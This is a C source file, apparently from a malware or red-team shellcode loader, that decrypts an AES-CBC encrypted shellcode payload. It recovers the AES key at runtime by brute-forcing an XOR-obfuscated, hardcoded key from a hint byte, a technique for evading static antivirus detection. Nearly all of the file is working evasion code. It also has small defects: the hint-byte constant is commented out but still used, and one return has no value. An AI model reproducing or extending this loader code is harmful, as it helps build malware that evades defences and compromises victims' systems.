/*
 *  ~ crypt.c ~
 * Key brute-force and payload [en/de]cryption
 * Author: jakobfriedl
 */

#include "base.h"

//#define HINT_BYTE 0xE6

BOOL Decrypt(IN PBYTE pEncShellcode, IN SIZE_T sSize) {
    
    PRINTA("\n[~~~] Decrypting payload...\n"); 

    // AES variables
    struct AES_ctx ctx;
    
    PBYTE pRealKey = NULL; 
    unsigned char pProtectedKey[] = {
            0x31, 0x09, 0x48, 0x30, 0xA4, 0x33, 0x07, 0xDA, 0x82, 0x68, 0xEC, 0x8E, 0x90, 0x31, 0x9F, 0xF3,
            0x5B, 0x73, 0x39, 0xCC, 0xB8, 0xF4, 0xA1, 0x27, 0xFE, 0x1D, 0x55, 0x98, 0xD2, 0x1F, 0x9A, 0xC3 }; 
    unsigned char pIv[] = {
            0xA2, 0xD0, 0x12, 0x98, 0x15, 0xA5, 0x50, 0xF0, 0x18, 0xB6, 0x0E, 0x1C, 0xA1, 0x30, 0x9E, 0xB8 };

    // Brute force key decryption key 
    if (!BruteForceDecryptionKey(HINT_BYTE, pProtectedKey, sizeof(pProtectedKey), &pRealKey)) {
        PRINT_ERROR("BruteForceDecryptionKey");
        return FALSE;
    }
    OKAY("[ 0x%p ] Brute-forced decryption key.", pRealKey);
    PrintByteArray(pRealKey, sizeof(pProtectedKey));

    // Initialize AES
    AES_init_ctx_iv(&ctx, pRealKey, pIv);

    // Decrypt payload 
    AES_CBC_decrypt_buffer(&ctx, pEncShellcode, sSize);

    return TRUE; 
}

BYTE BruteForceDecryptionKey(IN BYTE HintByte, IN PBYTE pProtectedKey, IN SIZE_T sKey, OUT PBYTE* ppRealKey) {

    BYTE b = 0;

    // Allocate memory for key
    PBYTE pRealKey = (PBYTE)malloc(sKey);

    if (!pRealKey) {
        PRINT_ERROR("malloc");
        return;
    }

    // Brute force key based on hint byte
    while (TRUE) {

        // Using the hint byte, if this is equal, then we found the 'b' value needed to decrypt the key 
        if (((pProtectedKey[0] ^ b) - 0) == HintByte) {
            OKAY("Found matching key value: 0x%0.2X", b);
            break;
        }

        // Increment b and try again
        b++;
    }

    for (int i = 0; i < sKey; i++) {
        pRealKey[i] = (BYTE)((pProtectedKey[i] ^ b) - i);
    }

    *ppRealKey = pRealKey;

    return b;
}